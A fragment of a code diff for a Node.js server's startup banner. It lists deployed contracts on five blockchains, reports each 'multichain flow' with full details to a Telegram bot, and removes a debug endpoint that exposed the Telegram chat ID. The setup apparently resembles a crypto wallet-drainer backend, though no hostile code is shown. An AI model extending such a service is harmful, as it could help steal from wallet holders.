-  🌐 DEPLOYED CONTRACTS:
-  ✅ Ethereum: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
-  ✅ BSC: 0xb2ea58AcfC23006B3193E6F51297518289D2d6a0
-  ✅ Polygon: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
-  ✅ Arbitrum: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
-  ✅ Avalanche: 0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288
-  
-  🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
-  
-  📊 REPORTING: Every flow is reported to Telegram with full details
-  
-  🚀 READY FOR MULTICHAIN FLOWS
+  🤖 TELEGRAM STATUS: Checking...
   `);
   
-  await testTelegramConnection();
-});
-
-// Add this temporary endpoint after your root endpoint
-app.get('/api/debug-env', (req, res) => {
-  // Check if variables exist (without exposing full values)
-  res.json({
-    hasBotToken: !!process.env.TELEGRAM_BOT_TOKEN,
-    hasChatId: !!process.env.TELEGRAM_CHAT_ID,
-    botTokenLength: process.env.TELEGRAM_BOT_TOKEN ? process.env.TELEGRAM_BOT_TOKEN.length : 0,
-    chatIdValue: process.env.TELEGRAM_CHAT_ID || 'missing',
-    telegramEnabled: telegramEnabled,
-    nodeEnv: process.env.NODE_ENV
-  });
+  // Force test Telegram on startup
+  const telegramWorking = await testTelegramConnection();
+  
+  console.log(`
+  📊 TELEGRAM: ${telegramWorking ? '✅ CONNECTED' : '❌ DISABLED'}
+  
+  🚀 Server ready!
+  `);
 });
